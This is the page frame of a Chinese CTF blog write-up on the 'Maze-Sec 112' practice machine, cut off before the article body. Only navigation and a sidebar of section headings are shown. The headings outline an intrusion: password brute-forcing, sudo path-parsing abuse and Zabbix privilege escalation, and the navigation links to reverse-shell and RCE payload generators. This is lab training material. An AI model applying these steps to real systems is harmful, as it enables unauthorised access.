<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Maze-Sec 112 | the0n3</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/favicon.ico">
    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
    <link rel="stylesheet" href="/codeStyle/styles/github-dark.min.css">
    <script src="/codeStyle/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <meta name="description" content="CTF学习过程记录、随写、分享">
    <meta name="keywords" content="ctf,web,php,sql注入,xss,文件上传,文件包含,反序列化,代码审计,ssti模板注入,命令执行,框架复现,漏洞复现,渗透测试,内网,域,提权,网络安全,安全工具,漏洞分析,安全博客">
    <meta name="author" content="the0n3">
    <meta name="theme-color" content="#11a8cd">
    <meta name="google-site-verification" content="2rTU4TJf9FGp-0dfoTNgDPqEaVmD1mMxR_aabNaQXnQ">
    
    <link rel="preload" href="/assets/css/0.styles.85d6a2bf.css" as="style"><link rel="preload" href="/assets/js/app.dd92e586.js" as="script"><link rel="preload" href="/assets/js/2.1b31a38c.js" as="script"><link rel="preload" href="/assets/js/165.bdea775a.js" as="script"><link rel="prefetch" href="/assets/js/10.da3a9ecd.js"><link rel="prefetch" href="/assets/js/100.57c348e7.js"><link rel="prefetch" href="/assets/js/101.16fde8c2.js"><link rel="prefetch" href="/assets/js/102.2c293fc9.js"><link rel="prefetch" href="/assets/js/103.028ba4bb.js"><link rel="prefetch" href="/assets/js/104.d0fdc732.js"><link rel="prefetch" href="/assets/js/105.1491f031.js"><link rel="prefetch" href="/assets/js/106.4839f4c6.js"><link rel="prefetch" href="/assets/js/107.1fc63e34.js"><link rel="prefetch" href="/assets/js/108.d004b56a.js"><link rel="prefetch" href="/assets/js/109.bd135893.js"><link rel="prefetch" href="/assets/js/11.495f1ddd.js"><link rel="prefetch" href="/assets/js/110.cbffe834.js"><link rel="prefetch" href="/assets/js/111.e064ec0d.js"><link rel="prefetch" href="/assets/js/112.76db0263.js"><link rel="prefetch" href="/assets/js/113.e64fce0c.js"><link rel="prefetch" href="/assets/js/114.a9d762c1.js"><link rel="prefetch" href="/assets/js/115.d7f94e89.js"><link rel="prefetch" href="/assets/js/116.c51eadec.js"><link rel="prefetch" href="/assets/js/117.a0075e4a.js"><link rel="prefetch" href="/assets/js/118.e3b8277e.js"><link rel="prefetch" href="/assets/js/119.500d06d7.js"><link rel="prefetch" href="/assets/js/12.d33d3e1f.js"><link rel="prefetch" href="/assets/js/120.cd604e90.js"><link rel="prefetch" href="/assets/js/121.f82f0ca9.js"><link rel="prefetch" href="/assets/js/122.3da49069.js"><link rel="prefetch" href="/assets/js/123.35423cde.js"><link rel="prefetch" href="/assets/js/124.a6b9e1a3.js"><link rel="prefetch" href="/assets/js/125.9e5ceded.js"><link rel="prefetch" href="/assets/js/126.7de3f175.js"><link rel="prefetch" href="/assets/js/127.0ecc0fa5.js"><link rel="prefetch" href="/assets/js/128.2183e167.js"><link rel="prefetch" href="/assets/js/129.6c5d5940.js"><link rel="prefetch" href="/assets/js/13.a867320c.js"><link rel="prefetch" href="/assets/js/130.9c2477c6.js"><link rel="prefetch" href="/assets/js/131.73a9cff1.js"><link rel="prefetch" href="/assets/js/132.8d87afbf.js"><link rel="prefetch" href="/assets/js/133.ffdb55d1.js"><link rel="prefetch" href="/assets/js/134.de940b0c.js"><link rel="prefetch" href="/assets/js/135.be21968e.js"><link rel="prefetch" href="/assets/js/136.faa50c6a.js"><link rel="prefetch" href="/assets/js/137.0f7b166c.js"><link rel="prefetch" href="/assets/js/138.03c80654.js"><link rel="prefetch" href="/assets/js/139.afbcc371.js"><link rel="prefetch" href="/assets/js/14.9f7fdc54.js"><link rel="prefetch" href="/assets/js/140.c16094e1.js"><link rel="prefetch" href="/assets/js/141.43569204.js"><link rel="prefetch" href="/assets/js/142.74bc348b.js"><link rel="prefetch" href="/assets/js/143.65a3cbff.js"><link rel="prefetch" href="/assets/js/144.6a64a132.js"><link rel="prefetch" href="/assets/js/145.7102c1e7.js"><link rel="prefetch" href="/assets/js/146.a7733f4f.js"><link rel="prefetch" href="/assets/js/147.e22451da.js"><link rel="prefetch" href="/assets/js/148.18595ba0.js"><link rel="prefetch" href="/assets/js/149.86afe015.js"><link rel="prefetch" href="/assets/js/15.861a98f0.js"><link rel="prefetch" href="/assets/js/150.ccafb5c5.js"><link rel="prefetch" href="/assets/js/151.434cb23b.js"><link rel="prefetch" href="/assets/js/152.e7c539b4.js"><link rel="prefetch" href="/assets/js/153.1f75415b.js"><link rel="prefetch" href="/assets/js/154.28a39e24.js"><link rel="prefetch" href="/assets/js/155.5c273321.js"><link rel="prefetch" href="/assets/js/156.f37d3312.js"><link rel="prefetch" href="/assets/js/157.6bac791e.js"><link rel="prefetch" href="/assets/js/158.d897babc.js"><link rel="prefetch" href="/assets/js/159.da0d41da.js"><link rel="prefetch" href="/assets/js/16.cc74538d.js"><link rel="prefetch" href="/assets/js/160.a382a0ad.js"><link rel="prefetch" href="/assets/js/161.948f6b86.js"><link rel="prefetch" href="/assets/js/162.271a8c1e.js"><link rel="prefetch" href="/assets/js/163.ceb534f6.js"><link rel="prefetch" href="/assets/js/164.aa3bcb70.js"><link rel="prefetch" href="/assets/js/166.37bc50f4.js"><link rel="prefetch" href="/assets/js/167.a03f335f.js"><link rel="prefetch" href="/assets/js/168.1d5416d1.js"><link rel="prefetch" href="/assets/js/169.9349ade1.js"><link rel="prefetch" href="/assets/js/17.132fcbaf.js"><link rel="prefetch" href="/assets/js/170.b8ddb745.js"><link rel="prefetch" href="/assets/js/171.3ce54bf9.js"><link rel="prefetch" href="/assets/js/172.1d7eecb6.js"><link rel="prefetch" href="/assets/js/173.d456776b.js"><link rel="prefetch" href="/assets/js/174.97f2f383.js"><link rel="prefetch" href="/assets/js/175.439aaa63.js"><link rel="prefetch" href="/assets/js/176.106e4abd.js"><link rel="prefetch" href="/assets/js/177.af9f1ce0.js"><link rel="prefetch" href="/assets/js/178.a83b29ad.js"><link rel="prefetch" href="/assets/js/179.14469c12.js"><link rel="prefetch" href="/assets/js/18.0ae552af.js"><link rel="prefetch" href="/assets/js/180.b7dd16ea.js"><link rel="prefetch" href="/assets/js/181.6d4cb919.js"><link rel="prefetch" href="/assets/js/182.ff9ac8e7.js"><link rel="prefetch" href="/assets/js/183.2ca38a05.js"><link rel="prefetch" href="/assets/js/19.c48fa7c0.js"><link rel="prefetch" href="/assets/js/20.341ab73c.js"><link rel="prefetch" href="/assets/js/21.8ae77766.js"><link rel="prefetch" href="/assets/js/22.09205c94.js"><link rel="prefetch" href="/assets/js/23.36de4c19.js"><link rel="prefetch" href="/assets/js/24.dd0aa5e1.js"><link rel="prefetch" href="/assets/js/25.ac3d5247.js"><link rel="prefetch" href="/assets/js/26.7738564c.js"><link rel="prefetch" href="/assets/js/27.06c0e63a.js"><link rel="prefetch" href="/assets/js/28.72b76320.js"><link rel="prefetch" href="/assets/js/29.9dfc301d.js"><link rel="prefetch" href="/assets/js/3.083d80a0.js"><link rel="prefetch" href="/assets/js/30.e1502224.js"><link rel="prefetch" href="/assets/js/31.bcb9d920.js"><link rel="prefetch" href="/assets/js/32.deb31de7.js"><link rel="prefetch" href="/assets/js/33.93be7d64.js"><link rel="prefetch" href="/assets/js/34.ea106cb2.js"><link rel="prefetch" href="/assets/js/35.e27abc54.js"><link rel="prefetch" href="/assets/js/36.2def90c4.js"><link rel="prefetch" href="/assets/js/37.c4c014e3.js"><link rel="prefetch" href="/assets/js/38.e9f556bb.js"><link rel="prefetch" href="/assets/js/39.0cd736a7.js"><link rel="prefetch" href="/assets/js/4.a9cdbd8d.js"><link rel="prefetch" href="/assets/js/40.db64bde6.js"><link rel="prefetch" href="/assets/js/41.959454ab.js"><link rel="prefetch" href="/assets/js/42.2ef35913.js"><link rel="prefetch" href="/assets/js/43.5782064b.js"><link rel="prefetch" href="/assets/js/44.28fbc620.js"><link rel="prefetch" href="/assets/js/45.07c74048.js"><link rel="prefetch" href="/assets/js/46.e3db42a8.js"><link rel="prefetch" href="/assets/js/47.f708ca13.js"><link rel="prefetch" href="/assets/js/48.83fa197b.js"><link rel="prefetch" href="/assets/js/49.75e0152e.js"><link rel="prefetch" href="/assets/js/5.60027e55.js"><link rel="prefetch" href="/assets/js/50.b130cab6.js"><link rel="prefetch" href="/assets/js/51.4493eeb9.js"><link rel="prefetch" href="/assets/js/52.990f9f85.js"><link rel="prefetch" href="/assets/js/53.3caee6b2.js"><link rel="prefetch" href="/assets/js/54.b8728406.js"><link rel="prefetch" href="/assets/js/55.05fcd335.js"><link rel="prefetch" href="/assets/js/56.d538cfd5.js"><link rel="prefetch" href="/assets/js/57.1797e62e.js"><link rel="prefetch" href="/assets/js/58.7a754248.js"><link rel="prefetch" href="/assets/js/59.ac591ef3.js"><link rel="prefetch" href="/assets/js/6.b505ba82.js"><link rel="prefetch" href="/assets/js/60.344183f9.js"><link rel="prefetch" href="/assets/js/61.461678cb.js"><link rel="prefetch" href="/assets/js/62.fcdfc4d4.js"><link rel="prefetch" href="/assets/js/63.09c0a2e1.js"><link rel="prefetch" href="/assets/js/64.e92534ba.js"><link rel="prefetch" href="/assets/js/65.001faa0c.js"><link rel="prefetch" href="/assets/js/66.a4d4feb6.js"><link rel="prefetch" href="/assets/js/67.febca055.js"><link rel="prefetch" href="/assets/js/68.2a1bc8d1.js"><link rel="prefetch" href="/assets/js/69.d5835fd4.js"><link rel="prefetch" href="/assets/js/7.a96ac55e.js"><link rel="prefetch" href="/assets/js/70.e7fe0ee2.js"><link rel="prefetch" href="/assets/js/71.9076c6ea.js"><link rel="prefetch" href="/assets/js/72.7c8bce2f.js"><link rel="prefetch" href="/assets/js/73.0fcb141d.js"><link rel="prefetch" href="/assets/js/74.d21b5253.js"><link rel="prefetch" href="/assets/js/75.2aa5b7a5.js"><link rel="prefetch" href="/assets/js/76.6953aff6.js"><link rel="prefetch" href="/assets/js/77.fb38e4ef.js"><link rel="prefetch" href="/assets/js/78.4297b26b.js"><link rel="prefetch" href="/assets/js/79.98963574.js"><link rel="prefetch" href="/assets/js/8.2fb73b4d.js"><link rel="prefetch" href="/assets/js/80.96395084.js"><link rel="prefetch" href="/assets/js/81.52655a9e.js"><link rel="prefetch" href="/assets/js/82.e75a1391.js"><link rel="prefetch" href="/assets/js/83.e8ec8344.js"><link rel="prefetch" href="/assets/js/84.565ea14c.js"><link rel="prefetch" href="/assets/js/85.5ca599e1.js"><link rel="prefetch" href="/assets/js/86.f4e6c370.js"><link rel="prefetch" href="/assets/js/87.af5486d5.js"><link rel="prefetch" href="/assets/js/88.3cdb32b4.js"><link rel="prefetch" href="/assets/js/89.8a9f6beb.js"><link rel="prefetch" href="/assets/js/9.d63216c2.js"><link rel="prefetch" href="/assets/js/90.f0933bd3.js"><link rel="prefetch" href="/assets/js/91.16af275a.js"><link rel="prefetch" href="/assets/js/92.03d856bb.js"><link rel="prefetch" href="/assets/js/93.030d2056.js"><link rel="prefetch" href="/assets/js/94.54ac6b9f.js"><link rel="prefetch" href="/assets/js/95.f8a3089a.js"><link rel="prefetch" href="/assets/js/96.eefdd475.js"><link rel="prefetch" href="/assets/js/97.9226ead2.js"><link rel="prefetch" href="/assets/js/98.5f4b97af.js"><link rel="prefetch" href="/assets/js/99.2a986525.js">
    <link rel="stylesheet" href="/assets/css/0.styles.85d6a2bf.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="the0n3" class="logo"> <span class="site-name can-hide">the0n3</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/maze-sec-112/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><!----> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/maze-sec-112/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/e58824/" class="sidebar-link">永恒之蓝漏洞复现</a></li><li><a href="/pages/1f11c3/" class="sidebar-link">CVE-2020-0796 永恒之黑漏洞复现</a></li><li><a href="/pages/cd7cec/" class="sidebar-link">redis未授权访问漏洞复现</a></li><li><a href="/pages/msfproxy/" class="sidebar-link">MetaSploit内网代理</a></li><li><a href="/pages/windown/" class="sidebar-link">Windows远程下载文件</a></li><li><a href="/pages/weblogicshell/" class="sidebar-link">Weblogic 写入webshell</a></li><li><a href="/pages/Scanner/" class="sidebar-link">MazeSec Scanner</a></li><li><a href="/pages/link/" class="sidebar-link">MazeSec link</a></li><li><a href="/pages/giveyoushell/" class="sidebar-link">送你一道shell题</a></li><li><a href="/pages/maze-ezpwn/" class="sidebar-link">MazeSec ezpwn</a></li><li><a href="/pages/maze-sysadmin/" class="sidebar-link">MazeSec sysadmin</a></li><li><a href="/pages/maze-faker/" class="sidebar-link">MazeSec faker</a></li><li><a href="/pages/maze-bala/" class="sidebar-link">MazeSec bala</a></li><li><a href="/pages/maze-ezAI1/" class="sidebar-link">MazeSec ezAI1</a></li><li><a href="/pages/disk-root/" class="sidebar-link">disk组用户提权</a></li><li><a href="/pages/maze-babyshell/" class="sidebar-link">MazeSec BabyShell</a></li><li><a href="/pages/maze-babycms/" class="sidebar-link">MazeSec BabyCMS</a></li><li><a href="/pages/maze-babypass/" class="sidebar-link">MazeSec BabyPass</a></li><li><a href="/pages/maze-motto/" class="sidebar-link">MazeSec motto</a></li><li><a href="/pages/mysql-udf/" class="sidebar-link">mysql udf提权</a></li><li><a href="/pages/maze-xiyi/" class="sidebar-link">MazeSec XIYI</a></li><li><a href="/pages/maze-babyauth/" class="sidebar-link">MazeSec BabyAuth</a></li><li><a href="/pages/maze-vm1/" class="sidebar-link">MazeSec vm1</a></li><li><a href="/pages/maze-111z/" class="sidebar-link">MazeSec 111z</a></li><li><a href="/pages/maze-man/" class="sidebar-link">MazeSec Man</a></li><li><a href="/pages/maze-sudohome/" class="sidebar-link">MazeSec SudoHome</a></li><li><a href="/pages/maze-spiteful/" class="sidebar-link">MazeSec Spiteful</a></li><li><a href="/pages/maze-secure/" class="sidebar-link">MazeSec Secure</a></li><li><a href="/pages/maze-alluser/" class="sidebar-link">MazeSec AllUser</a></li><li><a href="/pages/hmv-realsaga/" class="sidebar-link">HackMyVM Realsaga 复盘</a></li><li><a href="/pages/hmv-tpn/" class="sidebar-link">HackMyVM tpN</a></li><li><a href="/pages/vulnyx-alpine/" class="sidebar-link">vulnyx alpine</a></li><li><a href="/pages/vulnyx-mailforge/" class="sidebar-link">vulnyx MailForge</a></li><li><a href="/pages/maze-sec-meltdown/" class="sidebar-link">Maze-sec Meltdown</a></li><li><a href="/pages/maze-sec-111/" class="sidebar-link">Maze-Sec 111</a></li><li><a href="/pages/maze-sec-112/" aria-current="page" class="active sidebar-link">Maze-Sec 112</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#靶机信息" class="sidebar-link">靶机信息</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#目标主机" class="sidebar-link">目标主机</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#端口扫描" class="sidebar-link">端口扫描</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#_80-端口服务探测" class="sidebar-link">80 端口服务探测</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#爆破-tuf-用户密码" class="sidebar-link">爆破 tuf 用户密码</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#sudo-提权" class="sidebar-link">sudo 提权</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#方案一-ta0方案-路径解析利用" class="sidebar-link">方案一：ta0方案（路径解析利用）</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/maze-sec-112/#_1-1、sudo-脚本分析" class="sidebar-link">1.1、sudo 脚本分析</a></li><li class="sidebar-sub-header level3"><a href="/pages/maze-sec-112/#_1-2、前置内容补充" class="sidebar-link">1.2、前置内容补充</a></li><li class="sidebar-sub-header level3"><a href="/pages/maze-sec-112/#_1-3、路径解析利用" class="sidebar-link">1.3、路径解析利用</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#方案二-毛坯房方案" class="sidebar-link">方案二：毛坯房方案</a></li><li class="sidebar-sub-header level2"><a href="/pages/maze-sec-112/#_2-1、环境补充与-web-部署" class="sidebar-link">2.1、环境补充与 Web 部署</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/maze-sec-112/#_2-2、静态编译-php-cli-解决依赖问题" class="sidebar-link">2.2、静态编译 php-cli 解决依赖问题</a></li><li class="sidebar-sub-header level3"><a href="/pages/maze-sec-112/#_2-3、zabbix-提权" class="sidebar-link">2.3、zabbix 提权</a></li></ul></li></ul></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><span data-v-06225672>渗透</span></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://the0n3.top" target="_blank" title="作者" class="beLink" data-v-06225672>the0n3</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2026-01-17</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img 